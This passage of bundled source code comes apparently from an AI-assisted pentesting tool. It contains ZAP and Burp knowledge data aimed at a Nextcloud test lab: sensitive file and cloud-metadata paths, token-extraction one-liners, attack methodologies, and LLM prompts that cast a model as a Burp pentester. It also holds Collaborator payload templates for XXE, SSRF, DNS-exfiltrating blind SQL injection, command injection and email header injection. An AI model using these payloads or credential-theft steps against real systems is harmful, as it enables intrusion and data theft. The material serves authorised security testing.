          "Check sessionStorage for temporary credentials and auth state",
          "Review cookies for sensitive data without HttpOnly/Secure flags",
          "Check IndexedDB for cached API responses containing PII"
        ],
        whatToLookFor: [
          "JWT tokens in localStorage (vulnerable to XSS theft)",
          "API keys or access tokens stored client-side",
          "User PII (email, phone, SSN) in browser storage",
          "OAuth refresh tokens in localStorage",
          "Session identifiers without HttpOnly flag",
          "Cached API responses with sensitive business data"
        ],
        attackVectors: [
          "XSS + localStorage theft = full account takeover",
          "Stolen JWT from storage allows session hijacking",
          "Cached PII extraction for identity theft",
          "Refresh token theft for persistent access"
        ],
        tools: ["ZAP Ajax Spider", "Browser DevTools", "ZAP Passive Scanner"]
      },
      {
        id: "js-library-audit",
        name: "JavaScript Library Vulnerability Audit",
        description: "Identify outdated or vulnerable JavaScript libraries loaded by the application. Known CVEs in client-side libraries (jQuery, Angular, lodash, etc.) can enable XSS, prototype pollution, and other attacks.",
        zapRuleIds: [10003, 90003, 10115],
        manualSteps: [
          "Spider the target to discover all loaded JavaScript files",
          "Check for version strings in JS file headers/comments",
          "Cross-reference discovered libraries with known CVE databases",
          "Check for Sub-Resource Integrity (SRI) on CDN-loaded scripts",
          "Verify scripts are not loaded from compromised CDNs (polyfill.io)",
          "Check for outdated jQuery, Angular 1.x, lodash with prototype pollution"
        ],
        whatToLookFor: [
          "jQuery < 3.5.0 (XSS via htmlPrefilter)",
          "Angular 1.x (template injection, sandbox escape)",
          "lodash < 4.17.21 (prototype pollution)",
          "moment.js (ReDoS vulnerabilities)",
          "Scripts from polyfill.io or other compromised CDNs",
          "Missing SRI hashes on third-party scripts"
        ],
        attackVectors: [
          "Exploit known CVEs in outdated libraries",
          "Supply chain attack via compromised CDN scripts",
          "Prototype pollution leading to XSS or auth bypass",
          "ReDoS for denial of service"
        ],
        tools: ["ZAP Spider", "Retire.js", "npm audit", "Snyk"]
      }
    ];
    SOURCE_CODE_DISCLOSURE_VECTORS = [
      {
        id: "git-exposure",
        name: "Git Repository Exposure",
        zapRuleIds: [42, 40035],
        paths: ["/.git/HEAD", "/.git/config", "/.git/index", "/.git/refs/heads/main", "/.gitignore"],
        indicators: ["ref: refs/heads/", "[core]", "[remote", "DIRC"],
        exploitability: "Full source code reconstruction using git-dumper or manual object download",
        postExploitation: [
          "Reconstruct full source code history with git checkout",
          "Extract secrets from git log (committed then removed)",
          "Find internal URLs, database schemas, API documentation",
          "Discover deployment scripts and infrastructure details"
        ]
      },
      {
        id: "svn-exposure",
        name: "SVN Repository Exposure",
        zapRuleIds: [41, 40035],
        paths: ["/.svn/entries", "/.svn/wc.db", "/.svn/pristine/"],
        indicators: ["svn:entry", "SQLite format 3"],
        exploitability: "Source code extraction via SVN metadata files",
        postExploitation: [
          "Download wc.db for full file listing and metadata",
          "Extract pristine copies of source files",
          "Find credentials in SVN properties"
        ]
      },
      {
        id: "env-file-exposure",
        name: "Environment File Exposure",
        zapRuleIds: [40034, 40035, 10095],
        paths: ["/.env", "/.env.local", "/.env.production", "/.env.development", "/.env.backup", "/env.js", "/config.js"],
        indicators: ["DB_PASSWORD=", "API_KEY=", "SECRET_KEY=", "DATABASE_URL=", "AWS_"],
        exploitability: "Direct credential extraction \u2014 often contains all service credentials",
        postExploitation: [
          "Use database credentials for direct DB access",
          "Use API keys for cloud service access (AWS, GCP, Azure)",
          "Use JWT secrets to forge authentication tokens",
          "Use SMTP credentials for email spoofing",
          "Use payment gateway keys (Stripe, PayPal) for financial fraud"
        ]
      },
      {
        id: "backup-file-exposure",
        name: "Backup & Config File Exposure",
        zapRuleIds: [10095, 40035],
        paths: [
          "/web.config.bak",
          "/web.config.old",
          "/wp-config.php.bak",
          "/config.php.bak",
          "/database.yml.bak",
          "/settings.py.bak",
          "/.DS_Store",
          "/Thumbs.db",
          "/package.json",
          "/composer.json",
          "/Gemfile",
          "/requirements.txt"
        ],
        indicators: ["<?php", "connectionString", "password:", "secret_key"],
        exploitability: "Configuration files often contain database credentials and API keys",
        postExploitation: [
          "Extract database credentials from config backups",
          "Map application dependencies for known CVE exploitation",
          "Find internal service URLs and architecture details"
        ]
      },
      {
        id: "webinf-exposure",
        name: "Java WEB-INF Exposure",
        zapRuleIds: [10045],
        paths: ["/WEB-INF/web.xml", "/WEB-INF/classes/", "/WEB-INF/lib/", "/META-INF/MANIFEST.MF"],
        indicators: ["<web-app", "<servlet", "Main-Class:"],
        exploitability: "Full Java application source and configuration exposure",
        postExploitation: [
          "Extract servlet mappings and URL patterns",
          "Download compiled .class files for decompilation",
          "Find database JNDI configurations",
          "Discover internal API endpoints from web.xml"
        ]
      },
      {
        id: "cloud-metadata",
        name: "Cloud Metadata Service Exposure",
        zapRuleIds: [90034],
        paths: [
          "http://169.254.169.254/latest/meta-data/",
          "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
          "http://metadata.google.internal/computeMetadata/v1/",
          "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
        ],
        indicators: ["ami-id", "instance-id", "AccessKeyId", "SecretAccessKey"],
        exploitability: "SSRF to cloud metadata can yield temporary IAM credentials with broad access",
        postExploitation: [
          "Use temporary AWS credentials for S3 bucket access",
          "Enumerate EC2 instances and security groups",
          "Access other cloud services using instance role",
          "Pivot to internal network via cloud VPC"
        ]
      }
    ];
    BROWSER_STORAGE_CHECKS = [
      {
        storageType: "localStorage",
        zapRuleIds: [12e4, 120001, 120002],
        sensitiveKeys: [
          "token",
          "jwt",
          "access_token",
          "refresh_token",
          "id_token",
          "api_key",
          "apiKey",
          "auth",
          "session",
          "user",
          "credentials",
          "password",
          "secret",
          "private_key",
          "bearer"
        ],
        description: "localStorage persists across browser sessions and is accessible to any JavaScript on the same origin. XSS can steal all stored data.",
        extractionMethod: "Object.keys(localStorage).forEach(k => console.log(k, localStorage.getItem(k)))"
      },
      {
        storageType: "sessionStorage",
        zapRuleIds: [12e4, 120001, 120002],
        sensitiveKeys: [
          "token",
          "jwt",
          "access_token",
          "auth_state",
          "csrf_token",
          "session_id",
          "user_data",
          "temp_credentials"
        ],
        description: "sessionStorage is cleared when the tab closes but is still vulnerable to XSS during the session.",
        extractionMethod: "Object.keys(sessionStorage).forEach(k => console.log(k, sessionStorage.getItem(k)))"
      },
      {
        storageType: "cookies",
        zapRuleIds: [10010, 10011, 10054, 10029],
        sensitiveKeys: [
          "session",
          "JSESSIONID",
          "PHPSESSID",
          "connect.sid",
          "auth",
          "token",
          "remember_me",
          "csrf"
        ],
        description: "Cookies without HttpOnly flag are accessible to JavaScript. Missing Secure flag allows interception over HTTP.",
        extractionMethod: "document.cookie"
      },
      {
        storageType: "indexedDB",
        zapRuleIds: [12e4],
        sensitiveKeys: [
          "user_profile",
          "cached_responses",
          "offline_data",
          "encryption_keys"
        ],
        description: "IndexedDB can store large amounts of structured data including cached API responses with PII.",
        extractionMethod: "indexedDB.databases().then(dbs => console.log(dbs))"
      }
    ];
  }
});

// server/lib/knowledge/burp-pentesting-knowledge.ts
async function initBurpKnowledge() {
  if (_loaded) return;
  const data = await loadKnowledgeData("burp_pentesting_knowledge.json", FALLBACK);
  SCAN_TYPES = data.scanTypes?.length ? data.scanTypes : INLINE_SCAN_TYPES;
  ISSUE_DEFINITIONS = data.issueDefinitions || [];
  SCAN_CONFIGS = data.scanConfigs?.length ? data.scanConfigs : INLINE_SCAN_CONFIGS;
  EXTENSIONS = data.extensions || [];
  ATTACK_PROFILES = data.attackProfiles?.length ? data.attackProfiles : INLINE_ATTACK_PROFILES;
  COLLABORATOR_PAYLOADS = data.collaboratorPayloads?.length ? data.collaboratorPayloads : INLINE_COLLABORATOR_PAYLOADS;
  CROSS_TOOL_CORRELATIONS = data.crossToolCorrelations?.length ? data.crossToolCorrelations : INLINE_CROSS_TOOL_CORRELATIONS;
  LLM_PROMPTS = data.llmPrompts?.length ? data.llmPrompts : INLINE_LLM_PROMPTS;
  _loaded = true;
  console.log(`[BurpKnowledge] Loaded ${SCAN_TYPES.length} scan types, ${ISSUE_DEFINITIONS.length} issue defs, ${ATTACK_PROFILES.length} attack profiles, ${CROSS_TOOL_CORRELATIONS.length} cross-tool correlations`);
}
function getBurpScanConfigContext(technology) {
  let configs = SCAN_CONFIGS;
  if (technology) {
    configs = SCAN_CONFIGS.filter(
      (c) => c.targetTech.some((t) => t.toLowerCase().includes(technology.toLowerCase())) || c.targetTech.includes("any")
    );
    if (configs.length === 0) configs = SCAN_CONFIGS;
  }
  const sections = configs.map((c) => {
    const auditTypes = c.auditConfig.issueTypes.length > 0 ? c.auditConfig.issueTypes.join(", ") : "Passive only";
    return `### ${c.name} [${c.scanType}] (Priority: ${c.priority})
${c.description}
**Target Tech:** ${c.targetTech.join(", ")}
**Crawl:** depth=${c.crawlConfig.maxCrawlDepth}, strategy=${c.crawlConfig.crawlStrategy}
**Audit Types:** ${auditTypes}
**Insertion Points:** ${c.auditConfig.insertionPoints.join(", ")}
**Detection Methods:** ${c.auditConfig.detectionMethods.join(", ")}
**When to use:** ${c.useWhen}`;
  }).join("\n\n");
  return `## Burp Suite Scan Configurations
Select the optimal scan configuration based on target and phase:

${sections}

**Configuration Strategy:**
1. Start with full crawl_and_audit for initial reconnaissance
2. Follow up with targeted audit_only for specific vulnerability classes
3. Use passive-only for production targets or strict RoE
4. Always configure application_logins for authenticated scanning
5. Enable Collaborator for OOB detection (SSRF, blind XXE, blind SQLi)`;
}
function getBurpAttackProfileContext(vulnClass) {
  let profiles = ATTACK_PROFILES;
  if (vulnClass) {
    profiles = ATTACK_PROFILES.filter(
      (p) => p.vulnClass.toLowerCase().includes(vulnClass.toLowerCase()) || p.targetCwes.some((c) => c.toLowerCase().includes(vulnClass.toLowerCase()))
    );
    if (profiles.length === 0) profiles = ATTACK_PROFILES;
  }
  const sections = profiles.map((p) => {
    const steps = p.methodology.map((s) => `  ${s}`).join("\n");
    const zapRefs = p.zapCrossRef.map(
      (r) => `  - ZAP Alert ${r.alertId}: ${r.overlap} overlap \u2014 ${r.note}`
    ).join("\n");
    return `### ${p.name} [${p.bountyPriority.toUpperCase()}] \u2014 ${p.vulnClass}
${p.description}
**ATT&CK:** ${p.attackTechniques.join(", ")} | **CWEs:** ${p.targetCwes.join(", ")}
**Burp Tools:** ${p.burpTools.join(", ")}

**Methodology:**
${steps}

**ZAP Cross-Reference:**
${zapRefs}

**Expected Findings:** ${p.expectedFindings.join("; ")}`;
  }).join("\n\n");
  return `## Burp Attack Profiles (Bug Bounty Optimized)
${profiles.length} attack profiles for systematic vulnerability hunting:

${sections}

**Attack Profile Selection:**
1. Start with CRITICAL bounty priority profiles
2. Use Collaborator for all OOB detection vectors
3. Cross-reference ZAP findings to avoid duplicate testing
4. Chain findings across profiles for maximum impact
5. Document exploitation steps for reproducible bug reports`;
}
function getBurpCollaboratorContext() {
  const sections = COLLABORATOR_PAYLOADS.map((p) => {
    return `### ${p.vulnType} [${p.expectedInteraction.toUpperCase()}] ${p.burpExclusive ? "\u{1F512} BURP-EXCLUSIVE" : ""}
**Insertion Point:** ${p.insertionPoint}
**Payload:** \`${p.payloadTemplate}\`
**Description:** ${p.description}`;
  }).join("\n\n");
  return `## Burp Collaborator Payloads
Out-of-band detection payloads \u2014 these find vulnerabilities ZAP cannot detect:

${sections}

**Collaborator Usage Strategy:**
1. Replace {{collaborator}} with your Burp Collaborator domain
2. Send payloads via Repeater for precise control
3. Monitor Collaborator tab for DNS/HTTP/SMTP interactions
4. Any interaction confirms the vulnerability \u2014 document the timing and source
5. Use Collaborator findings as definitive proof in bug bounty reports
6. \u{1F512} BURP-EXCLUSIVE payloads have NO ZAP equivalent \u2014 these are Burp's key advantage`;
}
function getCrossToolCorrelationContext() {
  const sections = CROSS_TOOL_CORRELATIONS.map((c) => {
    return `- Burp #${c.burpIssueType} \u2194 ZAP #${c.zapAlertId}: **${c.correlationStrength}** \u2192 ${c.mergeStrategy} | Key: \`${c.deduplicationKey}\` | ${c.notes}`;
  }).join("\n");
  return `## Cross-Tool Correlation Map (Burp \u2194 ZAP)
Deduplicate and correlate findings between Burp Suite and OWASP ZAP:

${sections}

**Correlation Strategy:**
1. **exact**: Same vulnerability, same detection \u2014 merge evidence from both tools
2. **strong**: Same vuln class, different detection method \u2014 prefer the tool with higher confidence
3. **weak**: Related but different \u2014 report both with cross-reference
4. **complementary**: Different aspects of same attack surface \u2014 combine for full picture

**Deduplication Rules:**
- Use the deduplication key pattern to match findings across tools
- When merging, include evidence from BOTH tools in the report
- prefer_burp: Burp's detection is more accurate (e.g., Collaborator-confirmed)
- prefer_zap: ZAP's detection is more comprehensive (e.g., passive header checks)
- merge_evidence: Combine both \u2014 stronger report with dual-tool confirmation`;
}
function getBurpReasoningPrompt(phase) {
  const phaseMap = {
    scan_config: "burp-scan-config",
    triage: "burp-finding-triage",
    exploitation: "burp-attack-path"
  };
  const promptId = phaseMap[phase];
  if (!promptId) return null;
  return LLM_PROMPTS.find((p) => p.id === promptId) || null;
}
function buildBurpKnowledgeContext(params) {
  const sections = [];
  if (params.phase === "enumeration" || params.phase === "vuln_detection") {
    sections.push(getBurpScanConfigContext(params.technology));
  }
  if (params.phase === "vuln_detection" || params.phase === "exploitation") {
    if (params.includeAttackProfiles !== false) {
      sections.push(getBurpAttackProfileContext());
    }
  }
  if (params.phase === "vuln_detection" || params.phase === "exploitation") {
    if (params.includeCollaborator !== false) {
      sections.push(getBurpCollaboratorContext());
    }
  }
  if (params.phase === "vuln_detection" || params.phase === "exploitation" || params.phase === "reporting") {
    if (params.includeCrossToolCorrelation !== false) {
      sections.push(getCrossToolCorrelationContext());
    }
  }
  if (sections.length === 0) return "";
  return `# Burp Suite Pro Pentesting Knowledge Base

${sections.join("\n\n---\n\n")}`;
}
var FALLBACK, SCAN_TYPES, ISSUE_DEFINITIONS, SCAN_CONFIGS, EXTENSIONS, ATTACK_PROFILES, COLLABORATOR_PAYLOADS, CROSS_TOOL_CORRELATIONS, LLM_PROMPTS, _loaded, INLINE_SCAN_TYPES, INLINE_SCAN_CONFIGS, INLINE_ATTACK_PROFILES, INLINE_COLLABORATOR_PAYLOADS, INLINE_CROSS_TOOL_CORRELATIONS, INLINE_LLM_PROMPTS;
var init_burp_pentesting_knowledge = __esm({
  "server/lib/knowledge/burp-pentesting-knowledge.ts"() {
    "use strict";
    init_knowledge_loader();
    FALLBACK = {
      scanTypes: [],
      issueDefinitions: [],
      scanConfigs: [],
      extensions: [],
      attackProfiles: [],
      collaboratorPayloads: [],
      crossToolCorrelations: [],
      llmPrompts: []
    };
    SCAN_TYPES = [];
    ISSUE_DEFINITIONS = [];
    SCAN_CONFIGS = [];
    EXTENSIONS = [];
    ATTACK_PROFILES = [];
    COLLABORATOR_PAYLOADS = [];
    CROSS_TOOL_CORRELATIONS = [];
    LLM_PROMPTS = [];
    _loaded = false;
    INLINE_SCAN_TYPES = [
      {
        id: "crawl_and_audit",
        name: "Crawl and Audit",
        description: "Full crawl followed by active audit \u2014 the standard comprehensive scan",
        apiEndpoint: "POST /v0.1/scan",
        configKeys: ["scan_callback", "scope", "urls", "application_logins", "scan_configurations"],
        useCase: "Initial reconnaissance and vulnerability assessment of a new target",
        estimatedDuration: "30-120 min depending on app size"
      },
      {
        id: "audit_only",
        name: "Audit Only (Targeted)",
        description: "Skip crawl, audit specific URLs \u2014 faster for known endpoints",
        apiEndpoint: "POST /v0.1/scan",
        configKeys: ["scope", "urls", "scan_configurations"],
        useCase: "Re-testing specific endpoints after code changes or for focused vuln hunting",
        estimatedDuration: "5-30 min per endpoint group"
      },
      {
        id: "crawl_only",
        name: "Crawl Only",
        description: "Map the application without active testing \u2014 safe for production",
        apiEndpoint: "POST /v0.1/scan",
        configKeys: ["scope", "urls", "scan_configurations"],
        useCase: "Initial mapping before active testing, or production monitoring",
        estimatedDuration: "10-45 min"
      }
    ];
    INLINE_SCAN_CONFIGS = [
      {
        name: "nextcloud-full-audit",
        description: "Comprehensive Nextcloud audit \u2014 WebDAV, OCS API, sharing, auth endpoints",
        scanType: "crawl_and_audit",
        targetTech: ["nextcloud", "php", "webdav"],
        crawlConfig: {
          maxCrawlDepth: 8,
          maxLinkDepth: 10,
          crawlStrategy: "most_complete",
          scope: {
            include: ["/remote.php/", "/ocs/", "/index.php/", "/status.php", "/apps/"],
            exclude: ["/core/js/", "/core/css/", "/core/img/", "/.well-known/"]
          }
        },
        auditConfig: {
          issueTypes: [
            "sql_injection",
            "os_command_injection",
            "path_traversal",
            "file_upload",
            "xml_injection",
            "xxe",
            "ssrf",
            "ssti",
            "xss_reflected",
            "xss_stored",
            "csrf",
            "open_redirect",
            "header_injection",
            "ldap_injection",
            "xpath_injection",
            "http_request_smuggling",
            "deserialization"
          ],
          insertionPoints: ["url_path", "url_query", "body_params", "cookies", "headers"],
          detectionMethods: ["in_band", "out_of_band", "time_based"],
          followRedirects: true,
          concurrentRequests: 5
        },
        useWhen: "First scan of Nextcloud test lab \u2014 maps all attack surfaces",
        priority: 1
      },
      {
        name: "webdav-deep-audit",
        description: "Deep WebDAV protocol testing \u2014 PROPFIND/MOVE/COPY/LOCK injection",
        scanType: "audit_only",
        targetTech: ["webdav", "nextcloud"],
        crawlConfig: {
          maxCrawlDepth: 3,
          maxLinkDepth: 5,
          crawlStrategy: "fastest",
          scope: {
            include: ["/remote.php/dav", "/remote.php/webdav"],
            exclude: []
          }
        },
        auditConfig: {
          issueTypes: [
            "xml_injection",
            "xxe",
            "path_traversal",
            "sql_injection",
            "http_request_smuggling",
            "header_injection"
          ],
          insertionPoints: ["url_path", "body_params", "headers", "entire_body"],
          detectionMethods: ["in_band", "out_of_band", "time_based"],
          followRedirects: false,
          concurrentRequests: 3
        },
        useWhen: "Focused WebDAV testing after initial crawl identifies DAV endpoints",
        priority: 2
      },
      {
        name: "api-auth-audit",
        description: "Authentication and authorization testing \u2014 session management, CSRF, privilege escalation",
        scanType: "audit_only",
        targetTech: ["nextcloud", "php", "oauth", "saml"],
        crawlConfig: {
          maxCrawlDepth: 3,
          maxLinkDepth: 5,
          crawlStrategy: "fastest",
          scope: {
            include: ["/index.php/login", "/ocs/v2.php/cloud/users", "/index.php/settings/"],
            exclude: []
          }
        },
        auditConfig: {
          issueTypes: [
            "csrf",
            "session_fixation",
            "session_token_in_url",
            "open_redirect",
            "authentication_bypass",
            "privilege_escalation",
            "idor",
            "insecure_direct_object_reference"
          ],
          insertionPoints: ["url_query", "body_params", "cookies", "headers"],
          detectionMethods: ["in_band"],
          followRedirects: true,
          concurrentRequests: 2
        },
        useWhen: "Focused auth testing with multiple user accounts for privilege escalation",
        priority: 2
      },
      {
        name: "passive-crawl-only",
        description: "Safe passive scan \u2014 crawl and passive analysis only, no active injection",
        scanType: "crawl_only",
        targetTech: ["any"],
        crawlConfig: {
          maxCrawlDepth: 10,
          maxLinkDepth: 15,
          crawlStrategy: "most_complete",
          scope: { include: ["*"], exclude: [] }
        },
        auditConfig: {
          issueTypes: [],
          insertionPoints: [],
          detectionMethods: [],
          followRedirects: true,
          concurrentRequests: 10
        },
        useWhen: "Initial mapping of production targets or when RoE restricts active testing",
        priority: 3
      }
    ];
    INLINE_ATTACK_PROFILES = [
      {
        name: "ssrf-via-webdav",
        description: "Server-Side Request Forgery through WebDAV PROPFIND/COPY with external entity references",
        vulnClass: "SSRF",
        attackTechniques: ["T1190", "T1071.001"],
        targetCwes: ["CWE-918"],
        burpTools: ["scanner", "repeater", "collaborator"],
        methodology: [
          "1. Identify WebDAV endpoints via crawl (/remote.php/dav, /remote.php/webdav)",
          "2. Send PROPFIND with external DTD reference pointing to Collaborator",
          "3. Send COPY/MOVE with Destination header pointing to internal services",
          "4. Test LOCK with external entity in lock-token body",
          "5. Monitor Collaborator for DNS/HTTP interactions",
          "6. If interaction received, escalate to internal port scanning via SSRF",
          "7. Attempt to read internal metadata endpoints (169.254.169.254, internal APIs)"
        ],
        zapCrossRef: [
          { alertId: 40012, overlap: "partial", note: "ZAP tests basic SSRF but misses WebDAV-specific vectors" },
          { alertId: 90034, overlap: "none", note: "ZAP has no Collaborator equivalent for OOB SSRF" }
        ],
        expectedFindings: [
          "Collaborator DNS interaction from WebDAV PROPFIND",
          "Internal service response via COPY Destination header",
          "Cloud metadata exposure via SSRF chain"
        ],
        bountyPriority: "critical"
      },
      {
        name: "xxe-via-office-upload",
        description: "XML External Entity injection through document upload (DOCX/XLSX/SVG/XML)",
        vulnClass: "XXE",
        attackTechniques: ["T1190", "T1059.007"],
        targetCwes: ["CWE-611"],
        burpTools: ["scanner", "intruder", "repeater", "collaborator"],
        methodology: [
          "1. Upload crafted DOCX with XXE payload in [Content_Types].xml",
          "2. Upload SVG with external entity reference to Collaborator",
          "3. Upload XLSX with XXE in xl/sharedStrings.xml",
          "4. Test XML-based API endpoints (OCS API) with inline DTD",
          "5. Try parameter entity injection for blind XXE",
          "6. Use Collaborator to exfiltrate /etc/passwd via OOB XXE",
          "7. Chain with SSRF to access internal services"
        ],
        zapCrossRef: [
          { alertId: 90023, overlap: "partial", note: "ZAP tests basic XXE but not file-format-based vectors" }
        ],
        expectedFindings: [
          "OOB XXE via Collaborator interaction",
          "File content exfiltration via error-based XXE",
          "Internal network mapping via XXE-SSRF chain"
        ],
        bountyPriority: "critical"
      },
      {
        name: "idor-sharing-api",
        description: "Insecure Direct Object Reference in file sharing \u2014 access other users' shares",
        vulnClass: "IDOR/Broken Access Control",
        attackTechniques: ["T1080", "T1567"],
        targetCwes: ["CWE-639", "CWE-862"],
        burpTools: ["scanner", "intruder", "repeater"],
        methodology: [
          "1. Create shares as testuser1, note share IDs",
          "2. Use Intruder to enumerate share IDs (sequential/UUID patterns)",
          "3. Access shares as testuser2 \u2014 check for unauthorized access",
          "4. Modify share permissions as non-owner",
          "5. Test federated share endpoints for cross-instance access",
          "6. Check public link generation for predictable tokens",
          "7. Test share deletion as non-owner"
        ],
        zapCrossRef: [
          { alertId: 40018, overlap: "none", note: "ZAP has no IDOR-specific scanner \u2014 Burp Intruder is superior here" }
        ],
        expectedFindings: [
          "Unauthorized share access via sequential ID enumeration",
          "Permission modification by non-owner",
          "Predictable public share link tokens"
        ],
        bountyPriority: "high"
      },
      {
        name: "auth-bypass-ocsapi",
        description: "Authentication bypass via OCS API \u2014 missing auth checks, privilege escalation",
        vulnClass: "Authentication Bypass",
        attackTechniques: ["T1078", "T1548"],
        targetCwes: ["CWE-287", "CWE-269"],
        burpTools: ["scanner", "repeater", "intruder"],
        methodology: [
          "1. Map all OCS API endpoints with admin credentials",
          "2. Replay requests without auth headers \u2014 check for unprotected endpoints",
          "3. Replay admin-only requests with regular user credentials",
          "4. Test HTTP method override (X-HTTP-Method-Override, _method param)",
          "5. Test path traversal in API routes (/ocs/v2.php/cloud/../admin/)",
          "6. Check for API key leakage in responses",
          "7. Test rate limiting on login endpoint"
        ],
        zapCrossRef: [
          { alertId: 10045, overlap: "partial", note: "ZAP detects missing auth but not privilege escalation patterns" }
        ],
        expectedFindings: [
          "Unprotected admin API endpoints",
          "Privilege escalation from user to admin role",
          "Missing rate limiting on authentication endpoints"
        ],
        bountyPriority: "high"
      },
      {
        name: "stored-xss-collaboration",
        description: "Stored XSS via collaboration features \u2014 Deck cards, Forms, Talk messages, file names",
        vulnClass: "Stored XSS",
        attackTechniques: ["T1059.007"],
        targetCwes: ["CWE-79"],
        burpTools: ["scanner", "repeater", "intruder"],
        methodology: [
          "1. Inject XSS payloads in Deck card titles and descriptions",
          "2. Inject in Forms field labels and option values",
          "3. Inject in Talk chat messages (markdown rendering)",
          "4. Upload files with XSS in filename (rendered in sharing UI)",
          "5. Inject in calendar event titles and descriptions",
          "6. Test SVG upload with embedded JavaScript",
          "7. Check Content-Security-Policy bypass vectors"
        ],
        zapCrossRef: [
          { alertId: 40012, overlap: "strong", note: "ZAP active XSS scanner covers reflected; Burp better at stored XSS detection" },
          { alertId: 40014, overlap: "strong", note: "ZAP persistent XSS scanner \u2014 good overlap with Burp" }
        ],
        expectedFindings: [
          "Stored XSS in collaboration app rendering",
          "CSP bypass via SVG or data: URI",
          "DOM-based XSS in client-side rendering"
        ],
        bountyPriority: "high"
      }
    ];
    INLINE_COLLABORATOR_PAYLOADS = [
      {
        vulnType: "SSRF (WebDAV)",
        payloadTemplate: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{{collaborator}}">]><d:propfind xmlns:d="DAV:"><d:prop><d:displayname>&xxe;</d:displayname></d:prop></d:propfind>',
        insertionPoint: "body_params",
        expectedInteraction: "http",
        description: "PROPFIND with external entity \u2014 triggers HTTP callback if XXE is processed",
        burpExclusive: true
      },
      {
        vulnType: "Blind XXE (File Upload)",
        payloadTemplate: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://{{collaborator}}/xxe">%xxe;]><root/>',
        insertionPoint: "body_params",
        expectedInteraction: "dns",
        description: "Parameter entity XXE \u2014 DNS interaction confirms XML parsing of uploaded content",
        burpExclusive: true
      },
      {
        vulnType: "SSRF (Image Preview)",
        payloadTemplate: "http://{{collaborator}}/image.png",
        insertionPoint: "url_query",
        expectedInteraction: "http",
        description: "Image URL in preview/thumbnail endpoint \u2014 HTTP callback if server fetches",
        burpExclusive: true
      },
      {
        vulnType: "Blind SQL Injection",
        payloadTemplate: "1' AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\',@@version,'.{{collaborator}}\\\\a')))-- ",
        insertionPoint: "url_query",
        expectedInteraction: "dns",
        description: "DNS exfiltration via MySQL LOAD_FILE \u2014 confirms blind SQLi with data extraction",
        burpExclusive: true
      },
      {
        vulnType: "OS Command Injection",
        payloadTemplate: "; nslookup {{collaborator}} ;",
        insertionPoint: "body_params",
        expectedInteraction: "dns",
        description: "DNS lookup via command injection \u2014 confirms RCE capability",
        burpExclusive: false
      },
      {
        vulnType: "Email Header Injection",
        payloadTemplate: "test@test.com%0aBcc:{{collaborator}}@mail.com",
        insertionPoint: "body_params",
        expectedInteraction: "smtp",
        description: "SMTP header injection in email functionality \u2014 confirms mail relay abuse",
        burpExclusive: true
      }
    ];
    INLINE_CROSS_TOOL_CORRELATIONS = [
      { burpIssueType: 1049088, zapAlertId: 40012, correlationStrength: "exact", mergeStrategy: "merge_evidence", deduplicationKey: "xss:reflected:{url}:{param}", notes: "Both detect reflected XSS \u2014 merge evidence for stronger report" },
      { burpIssueType: 1049600, zapAlertId: 40014, correlationStrength: "exact", mergeStrategy: "merge_evidence", deduplicationKey: "xss:stored:{url}:{param}", notes: "Stored XSS \u2014 Burp often finds more insertion points" },
      { burpIssueType: 1048832, zapAlertId: 40018, correlationStrength: "strong", mergeStrategy: "prefer_burp", deduplicationKey: "sqli:{url}:{param}", notes: "SQL injection \u2014 Burp's detection is more accurate with fewer FPs" },
      { burpIssueType: 1049344, zapAlertId: 90023, correlationStrength: "strong", mergeStrategy: "prefer_burp", deduplicationKey: "xxe:{url}", notes: "XXE \u2014 Burp Collaborator provides definitive OOB proof" },
      { burpIssueType: 1050112, zapAlertId: 40012, correlationStrength: "weak", mergeStrategy: "report_both", deduplicationKey: "ssrf:{url}:{param}", notes: "SSRF \u2014 Burp Collaborator is essential, ZAP has limited SSRF detection" },
      { burpIssueType: 1048576, zapAlertId: 40019, correlationStrength: "exact", mergeStrategy: "merge_evidence", deduplicationKey: "cmdi:{url}:{param}", notes: "OS command injection \u2014 both tools detect, merge for completeness" },
      { burpIssueType: 2097920, zapAlertId: 10020, correlationStrength: "exact", mergeStrategy: "prefer_zap", deduplicationKey: "csrf:{url}", notes: "CSRF \u2014 ZAP's passive detection is comprehensive" },
      { burpIssueType: 5244416, zapAlertId: 10038, correlationStrength: "exact", mergeStrategy: "prefer_zap", deduplicationKey: "csp:{url}", notes: "CSP issues \u2014 ZAP's passive scanner is thorough" },
      { burpIssueType: 5243392, zapAlertId: 10035, correlationStrength: "exact", mergeStrategy: "prefer_zap", deduplicationKey: "hsts:{url}", notes: "Strict-Transport-Security \u2014 passive detection, ZAP is reliable" },
      { burpIssueType: 1049856, zapAlertId: 6, correlationStrength: "strong", mergeStrategy: "prefer_burp", deduplicationKey: "pathtraversal:{url}:{param}", notes: "Path traversal \u2014 Burp's active scanner has better payload coverage" }
    ];
    INLINE_LLM_PROMPTS = [
      {
        id: "burp-scan-config",
        phase: "scan_config",
        name: "Burp Scan Configuration Optimizer",
        systemPrompt: `You are an expert Burp Suite Professional pentester. Your role is to configure optimal Burp scans for bug bounty targets.

EXPERTISE AREAS:
- Burp REST API v0.1 scan configuration
- Crawl strategy optimization (fastest/more_complete/most_complete)
- Audit configuration for specific vulnerability classes
- Application login configuration for authenticated scanning
- Scope management to stay within RoE boundaries
- Scan resource optimization (concurrent requests, timeouts)

SCAN CONFIGURATION PRINCIPLES:
1. ALWAYS configure application_logins for authenticated scanning \u2014 unauthenticated scans miss 60%+ of attack surface
2. Use "crawl_and_audit" for initial scans, "audit_only" for re-testing specific endpoints
3. Set scope.include to match the engagement's RoE \u2014 NEVER scan out-of-scope domains
4. For Nextcloud: prioritize WebDAV, OCS API, and sharing endpoints
5. Enable Collaborator interactions for OOB vulnerability detection (SSRF, blind XXE, blind SQLi)
6. Reduce concurrent requests to 3-5 for targets behind WAF to avoid blocking
7. Configure scan_callback URL to receive real-time scan progress updates

BURP REST API SCAN REQUEST FORMAT:
{
  "scan_callback": { "url": "https://your-callback-url/burp-callback" },
  "scope": {
    "include": [{ "rule": "https://target.com/" }],
    "exclude": [{ "rule": "https://target.com/logout" }]
  },
  "urls": ["https://target.com/"],
  "application_logins": [{
    "password": "pass",
    "username": "user",
    "type": "UsernameAndPasswordLogin"
  }],
  "scan_configurations": [{ "name": "Audit checks - all except time-based detection methods" }]
}

BUILT-IN SCAN CONFIGURATIONS (use exact names):
